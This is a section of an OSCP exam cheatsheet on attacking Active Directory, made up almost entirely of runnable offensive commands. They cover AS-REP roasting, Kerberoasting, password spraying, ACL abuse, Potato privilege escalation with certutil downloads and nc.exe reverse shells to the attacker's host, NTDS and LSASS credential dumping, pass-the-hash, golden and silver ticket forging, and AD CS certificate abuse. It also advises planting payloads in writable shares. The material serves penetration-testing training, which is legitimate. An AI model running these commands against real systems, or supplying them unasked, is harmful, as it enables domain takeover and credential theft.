# 05 · Active Directory

> Part of the **OSCP/OSCP+ cheatsheet** — [← back to index](README.md)

---

## ACTIVE DIRECTORY (the 40-point set — prioritize this)

> You start the AD set WITH a low-priv domain credential ("assumed breach"). Goal: pivot host→host→DC.
> Reminder: **Responder poisoning is BANNED on the exam.** **Metasploit can't be used for pivoting** (AD spans 3 hosts).

### Enumerate the domain (with your given creds)
```bash
# nxc / NetExec — primary domain enum
nxc smb $IP -u user -p pass --shares --users --groups --pass-pol
nxc smb $IP -u user -p pass --rid-brute            # enumerate all users
nxc ldap $IP -u user -p pass --bloodhound -c all --dns-server $IP
# BloodHound collection
bloodhound-python -u user -p pass -d target.htb -ns $IP -c all --zip
# web01 (domain-joined) — SharpHound zips by default; copy the .zip back to kali:
.\SharpHound.exe -c All --zipfilename loot           # -> <timestamp>_loot.zip
.\SharpHound.exe -c All --loop --loopduration 00:10:00   # spread collection out (quieter)
# LDAP dumps
ldapdomaindump -u 'target\user' -p pass $IP
# PowerView (on a Windows shell)
. .\PowerView.ps1
Get-NetUser | select samaccountname,description
Get-NetGroup "Domain Admins" -MemberOf
Find-LocalAdminAccess        # where can current user RDP/admin
Get-NetComputer -FullData
```
**Always read user `description` fields and SMB shares — creds hide there.**

### Get a first credential / hash
```bash
# AS-REP roast (users with "do not require preauth") - NO creds needed if you have usernames
impacket-GetNPUsers target.htb/ -dc-ip $IP -usersfile users.txt -no-pass -format hashcat
nxc ldap $IP -u user -p pass --asreproast asrep.txt
hashcat -m 18200 asrep.txt rockyou.txt

# Kerberoast (any valid domain cred -> SPN accounts' TGS hashes)
impacket-GetUserSPNs target.htb/user:pass -dc-ip $IP -request -outputfile kerb.txt
nxc ldap $IP -u user -p pass --kerberoasting kerb.txt
hashcat -m 13100 kerb.txt rockyou.txt

# Password spray (careful with lockout policy from --pass-pol)
nxc smb $IP -u users.txt -p 'Season2025!' --continue-on-success
kerbrute passwordspray -d target.htb users.txt 'Password1'
```

### ACL / object abuse (BloodHound shows the path)
```powershell
# ForceChangePassword on a user (Garfield pattern)
net rpc password "victim" "NewPass123!" -U "target.htb"/"me"%"mypass" -S $IP
# or PowerView:
Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force)
# GenericAll / GenericWrite on user -> set SPN then kerberoast (targeted), or shadow creds
Set-DomainObject -Identity victim -Set @{serviceprincipalname='fake/x'}   # then kerberoast
# GenericWrite on user -> TARGETED AS-REP roast (no SPN needed): flip DONT_REQ_PREAUTH,
#   roast, then revert. If the account is disabled, clear ACCOUNTDISABLE FIRST or the roast fails:
bloodyAD -u me -p pass -d target.htb --host $IP add uac victim -f DONT_REQ_PREAUTH
impacket-GetNPUsers target.htb/ -dc-ip $IP -request-user victim -no-pass -format hashcat
bloodyAD -u me -p pass -d target.htb --host $IP remove uac victim -f DONT_REQ_PREAUTH   # cleanup
# GenericAll on group -> add yourself
net group "Target Group" me /add /domain
# GenericAll on computer / shadow credentials (modern):
certipy shadow auto -u me@target.htb -p pass -account VICTIM$ -dc-ip $IP
# WriteOwner -> make yourself owner, then grant yourself GenericAll, then act:
impacket-owneredit -action write -new-owner me -target victim 'target.htb/me:pass'
impacket-dacledit -action write -rights FullControl -principal me -target victim 'target.htb/me:pass'
# bloodyAD equivalents (also seals plain LDAP):
bloodyAD -u me -p pass -d target.htb --host $IP set owner victim me
bloodyAD -u me -p pass -d target.htb --host $IP add genericAll victim me
```

### Local -> SYSTEM on a domain-joined host (the bridge to cred dumping)
> `secretsdump --sam --lsa`, mimikatz, and LSASS dumps all need **local admin / SYSTEM** on the
> box. When a foothold lands you as a service account (IIS app pool, MSSQL svc, custom service)
> or a plain low-priv domain user, this is the step that gets you there. First command, always:
```
whoami /priv
```
Output drives the technique. **State (Enabled/Disabled) doesn't matter — only whether the privilege is in the token at all:**

| Privilege                  | Technique                                      |
| -------------------------- | ---------------------------------------------- |
| `SeImpersonatePrivilege`   | Potato family (below) — most common on svc accts |
| `SeBackupPrivilege`        | Offline SAM/SYSTEM/NTDS dump (below)           |
| `SeRestorePrivilege`       | Arbitrary file write -> overwrite a SYSTEM bin |
| `SeTakeOwnershipPrivilege` | ACL games -> own + overwrite a SYSTEM file     |
| `SeDebugPrivilege`         | Token impersonation / procdump LSASS           |
| `SeLoadDriverPrivilege`    | Load a malicious driver                        |

**SeImpersonate -> SYSTEM (Potato family).** Abuses a DCOM/RPC auth callback from a SYSTEM COM server, then impersonates the token. Pick by OS version:

| Windows version                             | Tool                                     |
| ------------------------------------------- | ---------------------------------------- |
| 2008/2008R2/2012/2012R2/2016 (pre-May 2020) | **JuicyPotato**                          |
| 2019 / 2022 / Win10 1809+                   | **PrintSpoofer** or **GodPotato**        |
| Modern, Spooler disabled                    | **RoguePotato** (external OXID resolver) |
```
:: Stage tools to a writable dir
certutil -urlcache -split -f http://%TUN0%/Juicy.exe Juicy.exe
certutil -urlcache -split -f http://%TUN0%/nc.exe nc.exe
:: Dry-run: confirm the CLSID maps to a SYSTEM-owned COM server (should print SYSTEM)
.\Juicy.exe -z -c "{4991d34b-80a1-4291-83b6-3328366b9097}"
:: Fire
.\Juicy.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" ^
  -p C:\Windows\System32\cmd.exe ^
  -a "/c C:\Users\Public\nc.exe -e cmd.exe %TUN0% 1339" -t *
:: Modern hosts (2019/2022):
PrintSpoofer.exe -i -c "C:\Users\Public\nc.exe -e cmd.exe %TUN0% 1339"
GodPotato -cmd "C:\Users\Public\nc.exe -e cmd.exe %TUN0% 1339"
```
> **Quoting gotchas (the time-wasters):** `-a` is a SINGLE arg string — quote the whole thing or JuicyPotato chokes on the first inner `-`. Spawned proc inherits a cwd you don't control (usually system32) -> use **absolute paths** for nc.exe and any file. `-t *` tries both token APIs; leave it.
> **CLSID ref:** BITS `{4991d34b-80a1-4291-83b6-3328366b9097}` works on 2008/2012; many fail on 2016 — grab one from the ohpe Server 2016 list. Always `-z` test first. Token user != SYSTEM in `-z` -> wrong CLSID for this OS, move on. Callback but no shell -> cwd/abs-path issue or nc.exe not staged.

**SeBackupPrivilege -> offline NTDS/SAM dump.** On a DC this *is* domain compromise — no DCSync rights needed, you read NTDS.dit directly via the backup right:
```
:: SAM/SYSTEM (member server / workstation)
reg save HKLM\SAM C:\Temp\sam.save
reg save HKLM\SYSTEM C:\Temp\system.save
:: then offline:  impacket-secretsdump -sam sam.save -system system.save LOCAL
:: NTDS.dit on a DC (file is locked -> snapshot it)
diskshadow /s C:\Temp\dsh.txt          :: script: set context persistent / add volume c: / create / expose
robocopy /b X:\Windows\NTDS C:\Temp\ ntds.dit
reg save HKLM\SYSTEM C:\Temp\system.save
:: exfil both, then offline:
impacket-secretsdump -ntds ntds.dit -system system.save LOCAL
```
> Robocopy `/b` = backup mode, the flag that consumes SeBackupPrivilege. If `diskshadow` scripting is fiddly, `wbadmin` or the `SeBackupPrivilege.dll` + `SeRestoreAbusePoC` route also works. Offline `secretsdump -ntds` parsing avoids touching the DC's LSASS at all.

### Credential dumping & lateral movement
```bash
# Dump secrets (needs admin on target)
impacket-secretsdump 'target.htb/user:pass@'$IP
impacket-secretsdump -hashes :NThash 'target.htb/user@'$IP
nxc smb $IP -u user -p pass --sam --lsa
# Pass-the-Hash / Pass-the-Password lateral exec
nxc smb <subnet> -u user -H NThash                  # spray hash across hosts
impacket-psexec target.htb/user@$IP -hashes :NThash
impacket-wmiexec target.htb/user@$IP -hashes :NThash     # quieter than psexec
impacket-smbexec / impacket-atexec / impacket-dcomexec
evil-winrm -i $IP -u user -H NThash                 # if WinRM open
# Overpass-the-hash / Pass-the-Ticket
impacket-getTGT target.htb/user -hashes :NThash ; export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass target.htb/user@dc01.target.htb
```

### Rubeus (from a Windows shell — roasting, tickets, PtT)
```powershell
# web01 (domain-joined shell)
.\Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt
.\Rubeus.exe kerberoast /outfile:kerb.txt              # add /tgtdeleg to roast with the current TGT
.\Rubeus.exe asktgt /user:svc /rc4:<NThash> /ptt       # overpass-the-hash -> inject a TGT
.\Rubeus.exe asktgt /user:svc /aes256:<key> /ptt       # AES variant if RC4 is disabled
.\Rubeus.exe ptt /ticket:<base64|kirbi>                # pass-the-ticket (inject a stolen ticket)
.\Rubeus.exe s4u /user:svc$ /rc4:<hash> /impersonateuser:administrator /msdsspn:cifs/target /ptt
.\Rubeus.exe triage                                    # list tickets in memory  (dump /nowrap to extract)
```
Crack the roast output on kali with the hashcat modes in the password file (13100 / 18200).

### To Domain Admin / DC
```bash
# DCSync (needs Replication rights / DA-equiv ACL)
impacket-secretsdump -just-dc target.htb/user:pass@$IP
nxc smb $IP -u user -p pass -M ntdsutil           # if admin
# Pass the krbtgt hash if dumped = golden ticket (usually overkill for exam; prefer DCSync->admin)
# Once you have Administrator/DA NT hash:
impacket-psexec -hashes :<admin_nthash> administrator@<dc_ip>
```

### Ticket forging — Silver vs Golden (know which hash forges what)
Terminology first:
- **NT hash** = `MD4(UTF-16LE(password))`. This *is* "the NTLM hash" people mean for PtH/ticketer.
- **NetNTLMv2** = the challenge-response blob (Responder/coercion). **Cannot be passed** — you *crack* it to get the password, then derive the NT hash.
```bash
# NT hash from a cleartext password you cracked:
python3 -c 'import hashlib;print(hashlib.new("md4","P@ssw0rd!".encode("utf-16le")).hexdigest())'
```
`impacket-ticketer` forges two different things — pick by what key material you hold:
```bash
# SILVER ticket: service account's NT hash + domain SID + SPN.
#   Forges a TGS for THAT ONE service only, as any user (e.g. administrator).
impacket-ticketer -nthash <svc_NT> -domain-sid <SID> -domain corp.local \
  -spn MSSQLSvc/sql01.corp.local:1433 administrator
export KRB5CCNAME=administrator.ccache
impacket-mssqlclient -k sql01.corp.local        # then enable_xp_cmdshell -> RCE as the svc/SYSTEM

# GOLDEN ticket: krbtgt NT hash (or AES key) + domain SID. Forges a TGT for ANYONE, anywhere.
#   Needs krbtgt -> you must already be DCSync-capable / on the DC. A service acct hash will NOT do this.
impacket-ticketer -nthash <krbtgt_NT> -domain-sid <SID> -domain corp.local administrator
```
> Confirm the SPN actually maps to the account (`setspn` / BloodHound) before forging a silver ticket — it only works against the service that account runs. If the DC enforces AES, swap `-nthash` for `-aesKey <aes256>`. For the exam, silver tickets are a stepping stone (RCE on one service → escalate); a golden ticket means you already won (had krbtgt).

### Useful AD glue
- Time sync if Kerberos errors (`KRB_AP_ERR_SKEW`): `sudo ntpdate $DC` or `sudo timedatectl set-ntp off; sudo rdate -n $DC`.
- `KDC_ERR_WRONG_REALM`: your realm string doesn't match the AD domain's **full DNS name**. Set `$DOMAIN` to the exact FQDN (e.g. `corp.local`, not `corp`), uppercase it in `krb5.conf`'s `[libdefaults] default_realm`.
- Picky/locked-down DC throwing odd Kerberos errors: in `/etc/krb5.conf` set `rdns = false` and `dns_canonicalize_hostname = false` under `[libdefaults]`, and always target the DC by **FQDN** (matches the SPN). Get a TGT with `impacket-getTGT corp.local/user:pass` then `export KRB5CCNAME=user.ccache` and add `-k -no-pass` to impacket/nxc.
- Add DC + domain to `/etc/hosts`; use FQDN for Kerberos.
- `--local-auth` flag on nxc for local (non-domain) accounts.
- MSSQL linked-server double-hop (POO pattern): `EXEC ('xp_cmdshell ...') AT [LINKED]`.

### rpcclient / kerbrute enumeration (no creds)
```bash
rpcclient -U "" -N $IP                     # null session
rpcclient -U "target.htb\guest%" $IP       # guest
# inside rpcclient: enumdomusers ; queryuser 0x<rid> ; enumdomgroups ; querygroupmem 0x<rid>
#   getdompwinfo (lockout policy!) ; lsaenumsid ; lookupnames administrator ; netshareenum
kerbrute userenum -d target.htb --dc $IP users.txt   # valid usernames, no creds needed
# parse BloodHound user JSON for descriptions (creds hide there):
jq '.data[]|select(.Properties.description!=null)|{n:.Properties.name,d:.Properties.description}' users.json
```

### Mimikatz / credential extraction (need admin/SYSTEM)
```
privilege::debug
sekurlsa::logonpasswords        # plaintext + NTLM from LSASS
sekurlsa::ekeys                 # kerberos keys -> PtT / overpass-the-hash
lsadump::sam                    # local SAM   |   lsadump::cache (cached domain creds)
lsadump::dcsync /user:target\krbtgt        # DCSync (needs replication rights)
vault::cred  /  sekurlsa::dpapi            # stored / DPAPI creds
# Offline (SeDebug): procdump -accepteula -ma lsass.exe l.dmp -> pypykatz lsa minidump l.dmp
```

### Delegation (only if BloodHound flags it — usually beyond core OSCP scope)
```bash
# Constrained (TRUSTED_TO_AUTH_FOR_DELEGATION): impersonate via S4U
impacket-getST -spn cifs/target -impersonate administrator 'dom/svc:pass'
# RBCD (you have GenericWrite on a computer object): set msDS-AllowedToActOnBehalfOfOtherIdentity
#   then impacket-getST -spn ... -impersonate administrator. Tools: rubeus s4u.
# Unconstrained: coerce a DC auth (printerbug/PetitPotam) then grab its TGT. Note scope before sinking time.
```

### Find creds across the domain (after a foothold)
```bash
Snaffler.exe -s -o snaffler.log              # hunt shares for creds/keys/configs (Windows)
nxc smb <subnet> -u u -p p -M spider_plus    # spider readable shares
manspider <subnet> -u u -p p -c password     # grep file CONTENTS across all shares
# GPP cached creds in SYSVOL (Groups.xml etc.) -> decrypt the AES blob:
nxc smb $IP -u u -p p -M gpp_password ; gpp-decrypt <cpassword>
# LAPS local-admin passwords (if readable):
nxc ldap $IP -u u -p p -M laps
```
> **A writable share is code execution, not just creds.** If a higher-priv user or a scheduled process auto-loads content from a path you can write (VS Code extensions / `extensions.json`, startup scripts, profile/`Documents` paths, an app's plugin dir, Outlook rules), plant a payload there and it runs **in their context** → lateral movement without their password. Check share ACLs with `smbcacls`/BloodHound; SID-based ACLs survive object recreation.

### Sealed LDAP, object restore & newer primitives
- **LDAP signing / channel-binding enforced** (binds fail with `strongerAuthRequired`, or BloodHound collectors choke on plain LDAP)? Many tools can't seal a plain bind. Use **bloodyAD** (NTLM sealing built in) for read/write, or run everything over **Kerberos** (`getTGT` + ccache, krb5.conf as above). If LDAPS (636) just resets, there's no LDAPS cert on the DC → go NTLM-sealed/Kerberos, don't fight 636.
```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local get writable   # what can I edit?
# legacy bloodhound-python can't seal plain binds; rusthound-ce hits the same wall w/o Kerberos.
# collect via Kerberos ccache, or use bloodyAD to walk ACLs directly.
```
- **Tombstone reanimation** (restore a deleted AD object): with `WRITE` on a deleted (tombstoned) object **and** `CREATE_CHILD` on a target OU, undelete it back into the directory — useful when a privileged-but-removed account is the intended path:
```bash
bloodyAD -u user -p pass -d corp.local --host dc01.corp.local set restore <deletedObj> \
  --newParent OU=Employees,DC=corp,DC=local
```
- **BadSuccessor / dMSA** (Windows **Server 2025** only): with `CreateChild` on an OU, create a `msDS-DelegatedManagedServiceAccount` that "supersedes" a privileged account, then request its TGT — the KDC grants the predecessor's privileges. Tools: `SharpSuccessor`, NetExec `badsuccessor` module, `bloodyAD` badSuccessor. Point the create at an **OU where `CreateChild` is confirmed** (not a user DN) and run as the principal holding that right. **Out of current OSCP exam scope** (no 2025 DCs on the exam) — lab/HTB only.
- **Shadow credentials** (`msDS-KeyCredentialLink`, via Whisker/certipy) need **PKINIT / AD CS** on the DC. If PKINIT is disabled (`KDC_ERR_PADATA_TYPE_NOSUPP` on cash-out, 636 resets with no cert), shadow creds are a **dead end** — pivot to targeted AS-REP/kerberoast or password reset instead. Don't keep retrying Whisker.

### AD CS (certificate abuse)
A vulnerable template or web-enrollment endpoint = any user's hash. Always check:
```bash
certipy find -u me@target.htb -p pass -dc-ip $IP -vulnerable -stdout
```
- **ESC1** — template lets the enrollee supply the SAN. Request a cert *as* a privileged user, then auth with it:
```bash
certipy req -u me@target.htb -p pass -dc-ip $IP -ca <CA-NAME> -template <VulnTemplate> \
  -upn administrator@target.htb
certipy auth -pfx administrator.pfx -dc-ip $IP        # -> NT hash + TGT for administrator
```
- **ESC8** — HTTP enrollment + NTLM relay. Stand up the relay, then coerce a DC/host to auth to it:
```bash
certipy relay -target http://<CA-HOST>/certsrv -template DomainController
# coerce: coercer / printerbug / PetitPotam -> relayed cert -> certipy auth -> DC hash
```
- **PKINIT disabled** (`.pfx` in hand but `KDC_ERR_PADATA_TYPE_NOSUPP`)? Auth over Schannel/LDAP instead:
```bash
certipy auth -pfx administrator.pfx -dc-ip $IP -ldap-shell
```

### OSCP-scope note
Focus drills: AS-REP roast, Kerberoast, password spray, ACL abuse (ForceChangePassword / GenericAll / GenericWrite / WriteOwner / WriteDACL), **`certipy find -vulnerable` (ESC1/ESC8)**, local-priv->SYSTEM via SeImpersonate (Potato) and SeBackupPrivilege NTDS dump, PtH/PtT lateral movement, secretsdump, DCSync. **Above exam scope** (skip unless flagged): RODC golden tickets, KeyList attacks, deeper ADCS chains (ESC9–16), unconstrained-delegation printerbug chains, BadSuccessor/dMSA (Server 2025).

---
